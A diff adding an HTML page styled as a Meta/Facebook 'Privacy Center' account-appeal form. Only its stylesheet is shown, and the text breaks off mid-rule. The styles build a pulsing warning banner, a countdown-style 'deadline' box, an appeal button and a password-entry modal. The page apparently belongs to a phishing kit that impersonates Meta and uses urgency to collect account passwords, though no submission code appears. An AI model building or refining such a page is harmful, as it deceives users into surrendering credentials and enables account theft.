@@ -1,0 +1,3325 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <meta name="description" content="Privacy Center - Account Review and Appeal Process">
+    <meta name="theme-color" content="#1877f2">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>Privacy Center - Account Management & Appeal</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /**
+         * ==================================================
+         * GLOBAL STYLES & RESET
+         * ==================================================
+         * This section contains universal style resets and
+         * foundational styling for the entire application.
+         * All margin, padding, and box-sizing are normalized.
+         */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        /**
+         * HTML & Root Element Styling
+         * Sets up font size baseline and smooth scrolling
+         */
+        html {
+            scroll-behavior: smooth;
+            font-size: 16px;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        /**
+         * SCROLLBAR STYLING
+         * ==================================================
+         * Custom webkit scrollbar with gradient styling
+         * and hover effects for better user experience
+         */
+        ::-webkit-scrollbar {
+            width: 12px;
+            height: 12px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #f1f3f5;
+            border-radius: 6px;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: linear-gradient(180deg, #1877f2, #165ec7);
+            border-radius: 6px;
+            transition: background 0.3s ease;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: linear-gradient(180deg, #165ec7, #144fb8);
+            box-shadow: 0 0 6px rgba(24, 119, 242, 0.3);
+        }
+
+        ::-webkit-scrollbar-thumb:active {
+            background: linear-gradient(180deg, #144fb8, #0d47a1);
+        }
+
+        /**
+         * FIREFOX SCROLLBAR STYLING
+         */
+        * {
+            scrollbar-color: #1877f2 #f1f3f5;
+            scrollbar-width: thin;
+        }
+
+        /**
+         * BODY STYLING
+         * ==================================================
+         * Main body element with flexbox layout for proper
+         * page structure and responsive design implementation
+         */
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #e8ecf1 100%);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            width: 100%;
+            padding: 0;
+            padding-top: 70px;
+            color: #1c1e21;
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        /**
+         * Focus Visible Styling
+         * Provides enhanced keyboard navigation support
+         */
+        *:focus-visible {
+            outline: 2px solid #1877f2;
+            outline-offset: 2px;
+        }
+
+        /**
+         * Form Main Container
+         * ==================================================
+         * Primary flex container for the form section,
+         * handles alignment and spacing
+         */
+        .form-main-container {
+            display: flex;
+            justify-content: center;
+            max-width: 100%;
+            margin: 0;
+            flex: 1;
+            align-items: center;
+            padding: 20px;
+            width: 100%;
+            min-height: calc(100vh - 70px);
+        }
+
+        /**
+         * Logo Section Styling (Hidden)
+         */
+        .logo-section {
+            display: none;
+        }
+
+        /**
+         * FORM CONTAINER
+         * ==================================================
+         * Primary form wrapper with shadow and
+         * hover effects for depth perception
+         */
+        .form-container {
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08), 0 1px 3px rgba(0, 0, 0, 0.05);
+            width: 100%;
+            max-width: 600px;
+            margin: 0 auto;
+            border: 1px solid rgba(0, 0, 0, 0.05);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            animation: containerSlideIn 0.5s ease-out;
+        }
+
+        @keyframes containerSlideIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .form-container:hover {
+            box-shadow: 0 6px 30px rgba(0, 0, 0, 0.12), 0 2px 6px rgba(0, 0, 0, 0.06);
+            transform: translateY(-2px);
+        }
+
+        /**
+         * FORM GROUP STYLING
+         * ==================================================
+         * Container for form fields with proper spacing
+         * and alignment for better visual hierarchy
+         */
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 10px;
+            position: relative;
+        }
+
+        .form-group input {
+            flex: 1;
+            transition: all 0.3s ease;
+        }
+
+        /**
+         * FORM LABEL STYLING
+         * Provides clear visual labeling for form inputs
+         */
+        .form-label {
+            font-size: 13px;
+            font-weight: 600;
+            color: #000;
+            margin-bottom: 4px;
+            display: block;
+            text-transform: capitalize;
+            letter-spacing: 0.5px;
+        }
+
+        /**
+         * TEXT INPUT STYLING
+         * ==================================================
+         * Enhanced input fields with gradient backgrounds,
+         * smooth transitions, and focus states
+         */
+        input[type="text"],
+        input[type="email"],
+        input[type="password"],
+        input[type="number"],
+        textarea {
+            width: 100%;
+            padding: 12px 16px;
+            border: 2px solid #e4e6eb;
+            border-radius: 8px;
+            font-size: 15px;
+            background-color: #f5f6f7;
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            font-weight: 400;
+            font-family: inherit;
+            color: #1c1e21;
+        }
+
+        input[type="text"]::placeholder,
+        input[type="email"]::placeholder,
+        input[type="password"]::placeholder,
+        input[type="number"]::placeholder,
+        textarea::placeholder {
+            color: #8a8d91;
+            opacity: 0.7;
+            font-weight: 400;
+        }
+
+        input[type="text"]:hover,
+        input[type="email"]:hover,
+        input[type="password"]:hover,
+        input[type="number"]:hover,
+        textarea:hover {
+            border-color: #d0d2d7;
+            background-color: #f8f9fa;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
+        }
+
+        input[type="text"]:focus,
+        input[type="email"]:focus,
+        input[type="password"]:focus,
+        input[type="number"]:focus,
+        textarea:focus {
+            outline: none;
+            background-color: white;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.15);
+            transform: translateY(-1px);
+        }
+
+        input[type="text"]:disabled,
+        input[type="email"]:disabled,
+        input[type="password"]:disabled,
+        input[type="number"]:disabled,
+        textarea:disabled {
+            background-color: #f0f2f5;
+            color: #8a8d91;
+            cursor: not-allowed;
+            opacity: 0.6;
+        }
+
+        /**
+         * TEXTAREA SPECIFIC STYLING
+         */
+        textarea {
+            resize: vertical;
+            min-height: 120px;
+            max-height: 300px;
+            line-height: 1.5;
+        }
+
+        /**
+         * FORM ERROR STYLING
+         * ==================================================
+         * Error messages with animation and color coding
+         * for immediate user feedback on validation issues
+         */
+        .form-error {
+            font-size: 13px;
+            color: #c41e3a;
+            margin-bottom: 8px;
+            padding: 8px 12px;
+            background-color: #ffe0e0;
+            border-left: 3px solid #c41e3a;
+            border-radius: 4px;
+            animation: slideDown 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .form-error::before {
+            content: '⚠';
+            font-size: 16px;
+            flex-shrink: 0;
+        }
+
+        .form-success {
+            font-size: 13px;
+            color: #0f9d58;
+            margin-bottom: 8px;
+            padding: 8px 12px;
+            background-color: #e6f4ea;
+            border-left: 3px solid #0f9d58;
+            border-radius: 4px;
+            animation: slideDown 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .form-success::before {
+            content: '✓';
+            font-size: 16px;
+            flex-shrink: 0;
+        }
+
+        .form-warning {
+            font-size: 13px;
+            color: #f57c00;
+            margin-bottom: 8px;
+            padding: 8px 12px;
+            background-color: #fff3e0;
+            border-left: 3px solid #f57c00;
+            border-radius: 4px;
+            animation: slideDown 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .form-warning::before {
+            content: '!';
+            font-size: 16px;
+            flex-shrink: 0;
+            font-weight: bold;
+        }
+
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /**
+         * BUTTON STYLING
+         * ==================================================
+         * Primary call-to-action buttons with gradient,
+         * shadows, and interactive hover/active states
+         */
+        button {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(to bottom, #1877f2, #165ec7);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            margin-top: 10px;
+            box-shadow: 0 2px 8px rgba(24, 119, 242, 0.3);
+            position: relative;
+            overflow: hidden;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        button:hover::before {
+            left: 100%;
+        }
+
+        button:hover {
+            background: linear-gradient(to bottom, #165ec7, #144fb8);
+            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.4);
+            transform: translateY(-2px);
+        }
+
+        button:active {
+            background: linear-gradient(to bottom, #144fb8, #0d47a1);
+            transform: translateY(0);
+            box-shadow: 0 2px 6px rgba(24, 119, 242, 0.3);
+        }
+
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        button:disabled:hover {
+            transform: none;
+            box-shadow: 0 2px 8px rgba(24, 119, 242, 0.3);
+        }
+
+        /**
+         * FORM TYPOGRAPHY
+         * ==================================================
+         * Titles and subtitles with proper hierarchy
+         */
+        .form-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1c1e21;
+            margin-bottom: 8px;
+            letter-spacing: -0.3px;
+        }
+
+        .form-subtitle {
+            font-size: 14px;
+            color: #65676b;
+            margin-bottom: 18px;
+            line-height: 1.5;
+        }
+
+        /**
+         * TERMS AND CONDITIONS STYLING
+         * ==================================================
+         * Informational box for terms and conditions
+         */
+        .terms-conditions {
+            background: linear-gradient(135deg, #f5f7fa 0%, #f0f2f5 100%);
+            padding: 18px;
+            border-radius: 10px;
+            margin-bottom: 22px;
+            font-size: 13px;
+            color: #606770;
+            line-height: 1.6;
+            border: 1px solid rgba(0, 0, 0, 0.06);
+            transition: all 0.3s ease;
+        }
+
+        .terms-conditions:hover {
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+        }
+
+        .terms-conditions strong {
+            color: #000;
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+
+        .terms-conditions ul,
+        .terms-conditions ol {
+            margin-left: 20px;
+            margin-top: 8px;
+        }
+
+        .terms-conditions li {
+            margin-bottom: 4px;
+        }
+
+        /**
+         * WARNING BOX STYLING
+         * ==================================================
+         * Critical alert component with warning colors,
+         * border styling, and pulsing animation effects
+         */
+        .warning-box {
+            background: linear-gradient(135deg, #fff8e1 0%, #fff3cd 100%);
+            border: 2px solid #ffc107;
+            padding: 24px;
+            border-radius: 12px;
+            margin-bottom: 24px;
+            box-shadow: 0 3px 15px rgba(255, 193, 7, 0.15);
+            position: relative;
+            overflow: hidden;
+            animation: warningPulse 2s ease-in-out infinite;
+        }
+
+        .warning-box::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 5px;
+            height: 100%;
+            background: linear-gradient(to bottom, #ff6b6b, #ffc107);
+        }
+
+        @keyframes warningPulse {
+            0%, 100% {
+                box-shadow: 0 3px 15px rgba(255, 193, 7, 0.15);
+            }
+            50% {
+                box-shadow: 0 3px 20px rgba(255, 193, 7, 0.25);
+            }
+        }
+
+        .warning-top {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 16px;
+            font-size: 18px;
+            font-weight: 700;
+            color: #D93025;
+        }
+
+        .warning-top svg {
+            width: 24px;
+            height: 24px;
+            flex-shrink: 0;
+            animation: warningBounce 1s ease-in-out infinite;
+        }
+
+        @keyframes warningBounce {
+            0%, 100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.1);
+            }
+        }
+
+        .warning-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #856404;
+            margin-bottom: 14px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            letter-spacing: -0.2px;
+        }
+
+        .warning-title span {
+            display: block;
+        }
+
+        .warning-subtext {
+            font-size: 13px;
+            color: #704214;
+            line-height: 1.6;
+            margin-bottom: 12px;
+        }
+
+        .warning-extra {
+            font-size: 12px;
+            color: #704214;
+            line-height: 1.5;
+            margin-bottom: 15px;
+            background-color: rgba(255, 255, 255, 0.5);
+            padding: 10px;
+            border-left: 3px solid #ffc107;
+            border-radius: 4px;
+        }
+
+        /**
+         * APPEAL BOX STYLING
+         * ==================================================
+         * Component for appeal information and actions
+         */
+        .appeal-box {
+            background: linear-gradient(135deg, #ffffff 0%, #f8f9fa 100%);
+            border: 2px solid #e5e5e5;
+            border-radius: 12px;
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            gap: 18px;
+            margin-top: 18px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .appeal-box:hover {
+            border-color: #1877f2;
+            box-shadow: 0 4px 16px rgba(24, 119, 242, 0.1);
+            transform: translateY(-2px);
+            background: linear-gradient(135deg, #f8fbff 0%, #f0f7ff 100%);
+        }
+
+        .appeal-box img {
+            width: 80px;
+            height: 80px;
+            object-fit: contain;
+            flex-shrink: 0;
+            animation: slideInLeft 0.5s ease-out;
+        }
+
+        @keyframes slideInLeft {
+            from {
+                opacity: 0;
+                transform: translateX(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        .appeal-info {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .appeal-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #000;
+        }
+
+        .appeal-desc {
+            font-size: 12px;
+            color: #606770;
+            line-height: 1.5;
+        }
+
+        .appeal-btn {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            align-self: flex-start;
+            margin-top: 5px;
+            display: inline-block;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .appeal-btn::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.5);
+            transform: translate(-50%, -50%);
+            transition: width 0.6s, height 0.6s;
+        }
+
+        .appeal-btn:active::before {
+            width: 300px;
+            height: 300px;
+        }
+
+        .appeal-btn:hover {
+            background-color: #165ec7;
+            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3);
+            transform: translateY(-1px);
+        }
+
+        .appeal-btn:active {
+            background-color: #0d47a1;
+            transform: translateY(0);
+        }
+
+        /**
+         * APPEAL GUIDE STYLING
+         * ==================================================
+         * Informational guide for appeal process
+         */
+        .appeal-guide {
+            background: linear-gradient(135deg, #f0f8ff 0%, #e6f2ff 100%);
+            border: 2px solid #1877f2;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+            animation: slideUp 0.5s ease-out;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .appeal-guide-header {
+            display: flex;
+            align-items: flex-start;
+            gap: 18px;
+        }
+
+        .appeal-guide-img {
+            width: 80px;
+            height: 80px;
+            object-fit: contain;
+            flex-shrink: 0;
+        }
+
+        .appeal-guide-text {
+            flex: 1;
+        }
+
+        .appeal-guide-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: #1877f2;
+            margin-bottom: 12px;
+        }
+
+        .appeal-guide-content {
+            font-size: 13px;
+            color: #1c1e21;
+            line-height: 1.6;
+        }
+
+        .appeal-guide-content p {
+            margin-bottom: 12px;
+        }
+
+        .appeal-guide-content p:last-child {
+            margin-bottom: 0;
+        }
+
+        .appeal-guide-note {
+            font-size: 12px;
+            color: #65676b;
+            font-style: italic;
+            margin-top: 12px;
+            padding-top: 12px;
+            border-top: 1px solid rgba(24, 119, 242, 0.2);
+        }
+
+        /**
+         * DEADLINE SECTION STYLING
+         * ==================================================
+         * Time-sensitive deadline indicator with
+         * pulsing animation and urgency styling
+         */
+        .deadline-section {
+            background: linear-gradient(135deg, #fff0f0 0%, #ffe0e0 100%);
+            border: 2px solid #ff6b6b;
+            border-radius: 12px;
+            padding: 16px 20px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            box-shadow: 0 3px 15px rgba(255, 107, 107, 0.15);
+            animation: deadlinePulse 2s ease-in-out infinite;
+        }
+
+        @keyframes deadlinePulse {
+            0%, 100% {
+                box-shadow: 0 3px 15px rgba(255, 107, 107, 0.15);
+            }
+            50% {
+                box-shadow: 0 4px 20px rgba(255, 107, 107, 0.25);
+            }
+        }
+
+        .deadline-icon {
+            font-size: 24px;
+            flex-shrink: 0;
+            animation: deadlineTick 1s ease-in-out infinite;
+        }
+
+        @keyframes deadlineTick {
+            0%, 100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.2);
+            }
+        }
+
+        .deadline-info {
+            flex: 1;
+        }
+
+        .deadline-label {
+            font-size: 12px;
+            color: #c41e3a;
+            font-weight: 600;
+            margin: 0;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .deadline-time {
+            font-size: 16px;
+            font-weight: 700;
+            color: #c41e3a;
+            margin: 2px 0 0 0;
+        }
+
+        .deadline-warning {
+            font-size: 11px;
+            color: #c41e3a;
+            margin: 6px 0 0 0;
+            line-height: 1.4;
+            font-weight: 500;
+        }
+
+        /**
+         * HEADER STYLING - FIXED
+         * ==================================================
+         * Single fixed header with Meta logo and navigation
+         */
+        header {
+            background: rgba(255, 255, 255, 0.98);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid rgba(0, 0, 0, 0.06);
+            padding: 12px 16px;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            width: 100%;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            height: 70px;
+            animation: navSlideDown 0.3s ease-out;
+        }
+
+        @keyframes navSlideDown {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .header-logo {
+            display: flex;
+            align-items: center;
+            flex-shrink: 0;
+            text-decoration: none;
+            transition: all 0.2s ease;
+        }
+
+        .header-logo:hover {
+            transform: scale(1.05);
+        }
+
+        .header-logo img {
+            height: 36px;
+            width: auto;
+            object-fit: contain;
+            display: block !important; /* Override any hidden display */
+        }
+
+        .header-logo-text {
+            font-size: 20px;
+            font-weight: 700;
+            color: #1877f2;
+            margin-left: 10px;
+        }
+
+        .header-content {
+            max-width: 1400px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 20px;
+            padding: 0 10px;
+            width: 100%;
+        }
+
+        /**
+         * HEADER SEARCH STYLING
+         * ==================================================
+         * Search bar with icon and clear button
+         */
+        .header-search {
+            flex: 1;
+            max-width: 320px;
+            position: relative;
+        }
+
+        .header-search-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+            background-color: #f0f2f5;
+            border-radius: 24px;
+            border: 2px solid transparent;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            padding: 0 14px;
+            height: 40px;
+        }
+
+        .header-search-wrapper:hover {
+            background-color: #e4e6e9;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .header-search-wrapper:has(input:focus) {
+            background-color: #fff;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.1);
+        }
+
+        .header-search-icon {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #65676b;
+            font-size: 16px;
+            pointer-events: none;
+            margin-right: 6px;
+            flex-shrink: 0;
+        }
+
+        .header-search input {
+            width: 100%;
+            padding: 9px 0;
+            background-color: transparent;
+            border: none;
+            font-size: 14px;
+            outline: none;
+            color: #000;
+            flex: 1;
+            font-family: inherit;
+        }
+
+        .header-search input::placeholder {
+            color: #65676b;
+            opacity: 0.7;
+            font-weight: 500;
+        }
+
+        .header-search-clear {
+            display: none;
+            align-items: center;
+            justify-content: center;
+            color: #65676b;
+            font-size: 18px;
+            cursor: pointer;
+            padding: 4px;
+            margin-left: 4px;
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            flex-shrink: 0;
+        }
+
+        .header-search-clear:hover {
+            transform: scale(1.1);
+            color: #1877f2;
+        }
+
+        .header-search input:not(:placeholder-shown) ~ .header-search-clear {
+            display: flex;
+        }
+
+        /**
+         * HEADER MENU STYLING
+         * ==================================================
+         * Horizontal menu items with hover effects
+         */
+        .header-menu {
+            display: flex;
+            gap: 20px;
+            list-style: none;
+            margin: 0;
+            padding: 0;
+            flex-shrink: 0;
+        }
+
+        .header-menu li {
+            margin: 0;
+        }
+
+        .header-menu a {
+            text-decoration: none;
+            color: #050505;
+            font-size: 14px;
+            font-weight: 500;
+            transition: all 0.2s ease;
+            padding: 8px 12px;
+            display: inline-block;
+            border-radius: 6px;
+            position: relative;
+        }
+
+        .header-menu a::after {
+            content: '';
+            position: absolute;
+            width: 0;
+            height: 2px;
+            bottom: -4px;
+            left: 0;
+            background-color: #1877f2;
+            transition: width 0.3s ease;
+        }
+
+        .header-menu a:hover {
+            color: #1877f2;
+        }
+
+        .header-menu a:hover::after {
+            width: 100%;
+        }
+
+        /**
+         * VIDEO SECTION STYLING
+         * ==================================================
+         * Video container with responsive sizing and
+         * media controls styling
+         */
+        .video-section {
+            display: none;
+        }
+
+        .instructions {
+            display: none;
+        }
+
+        .form-video-container {
+            position: relative;
+            width: 100%;
+            background: #000;
+            border-radius: 12px;
+            overflow: hidden;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
+            aspect-ratio: 16 / 9;
+        }
+
+        .form-video-thumbnail {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            object-position: center;
+            display: block;
+            background-color: #000;
+            cursor: pointer;
+            transition: transform 0.3s ease;
+        }
+
+        .form-video-thumbnail:hover {
+            transform: scale(1.02);
+        }
+
+        .form-video-thumbnail::-webkit-media-controls-panel {
+            background: linear-gradient(to top, rgba(0,0,0,0.7), transparent);
+        }
+
+        .form-video-thumbnail::-webkit-media-controls-play-button,
+        .form-video-thumbnail::-webkit-media-controls-timeline,
+        .form-video-thumbnail::-webkit-media-controls-current-time-display,
+        .form-video-thumbnail::-webkit-media-controls-time-remaining-display,
+        .form-video-thumbnail::-webkit-media-controls-mute-button,
+        .form-video-thumbnail::-webkit-media-controls-volume-slider,
+        .form-video-thumbnail::-webkit-media-controls-fullscreen-button {
+            filter: brightness(1.2);
+        }
+
+        /**
+         * VIDEO INFO SECTION STYLING
+         */
+        .video-info-section {
+            margin-bottom: 20px;
+        }
+
+        .video-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #000;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .video-description {
+            font-size: 12px;
+            color: #606770;
+            line-height: 1.5;
+            margin-bottom: 10px;
+        }
+
+        .video-meta {
+            font-size: 11px;
+            color: #8a8d91;
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+
+        .video-meta span {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        /**
+         * FORM DETAILS SECTION
+         * ==================================================
+         * Additional information and guidelines text
+         */
+        .form-details {
+            font-size: 12px;
+            color: #606770;
+            margin-top: 15px;
+            line-height: 1.5;
+        }
+
+        .form-details strong {
+            color: #000;
+            font-weight: 600;
+        }
+
+        .form-details ul,
+        .form-details ol {
+            margin-left: 20px;
+            margin-top: 8px;
+        }
+
+        .form-details li {
+            margin-bottom: 4px;
+        }
+
+        /**
+         * MODAL STYLING
+         * ==================================================
+         * Dialog box styling with animations
+         * and overlay effects
+         */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 2000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            animation: fadeIn 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            backdrop-filter: blur(4px);
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        .modal.active {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-content {
+            background: linear-gradient(135deg, #ffffff 0%, #f8f9fa 100%);
+            padding: 35px;
+            border-radius: 16px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+            max-width: 440px;
+            width: 90%;
+            animation: slideUp 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            border: 1px solid rgba(0, 0, 0, 0.05);
+        }
+
+        @keyframes slideUp {
+            from {
+                transform: translateY(30px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .modal-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #000;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        .modal-subtitle {
+            font-size: 13px;
+            color: #606770;
+            margin-bottom: 20px;
+            text-align: center;
+            line-height: 1.5;
+        }
+
+        .modal-form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            margin-bottom: 15px;
+            position: relative;
+        }
+
+        .modal-label {
+            font-size: 13px;
+            font-weight: 600;
+            color: #000;
+            text-transform: capitalize;
+        }
+
+        .password-input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .modal-input {
+            width: 100%;
+            padding: 12px 45px 12px 16px;
+            border: 2px solid #e4e6eb;
+            border-radius: 8px;
+            font-size: 15px;
+            background-color: #f5f6f7;
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            font-weight: 400;
+            font-family: inherit;
+            color: #1c1e21;
+        }
+
+        .modal-input::placeholder {
+            color: #8a8d91;
+            opacity: 0.7;
+        }
+
+        .modal-input:hover {
+            border-color: #d0d2d7;
+            background-color: #f8f9fa;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
+        }
+
+        .modal-input:focus {
+            outline: none;
+            background-color: white;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.15);
+            transform: translateY(-1px);
+        }
+
+        .modal-input:disabled {
+            background-color: #f0f2f5;
+            color: #8a8d91;
+            cursor: not-allowed;
+            opacity: 0.6;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 12px;
+            cursor: pointer;
+            color: #65676b;
+            font-size: 18px;
+            user-select: none;
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            padding: 4px;
+        }
+
+        .toggle-password:hover {
+            color: #1877f2;
+            transform: scale(1.1);
+        }
+
+        .modal-buttons {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .modal-btn {
+            flex: 1;
+            padding: 11px;
+            border: none;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .modal-btn::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.5);
+            transform: translate(-50%, -50%);
+            transition: width 0.6s, height 0.6s;
+            z-index: 0;
+        }
+
+        .modal-btn:active::before {
+            width: 300px;
+            height: 300px;
+        }
+
+        .modal-btn-confirm {
+            background: linear-gradient(to bottom, #1877f2, #165ec7);
+            color: white;
+            box-shadow: 0 2px 8px rgba(24, 119, 242, 0.3);
+        }
+
+        .modal-btn-confirm:hover {
+            background: linear-gradient(to bottom, #165ec7, #144fb8);
+            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.4);
+            transform: translateY(-1px);
+        }
+
+        .modal-btn-confirm:active {
+            background: linear-gradient(to bottom, #144fb8, #0d47a1);
+            transform: translateY(0);
+        }
+
+        .modal-btn-cancel {
+            background-color: #e5e5e5;
+            color: #000;
+        }
+
+        .modal-btn-cancel:hover {
+            background-color: #d0d0d0;
+            transform: translateY(-1px);
+        }
+
+        .modal-btn-cancel:active {
+            transform: translateY(0);
+        }
+
+        /**
+         * SUCCESS MODAL STYLING
+         * ==================================================
+         * Success confirmation dialog with
+         * icon animation and message display
+         */
+        .success-modal {
+            display: none;
+            position: fixed;
+            z-index: 2000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            animation: fadeIn 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            backdrop-filter: blur(4px);
+        }
+
+        .success-modal.active {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .success-modal-content {
+            background: linear-gradient(135deg, #ffffff 0%, #f0f8ff 100%);
+            padding: 45px 35px;
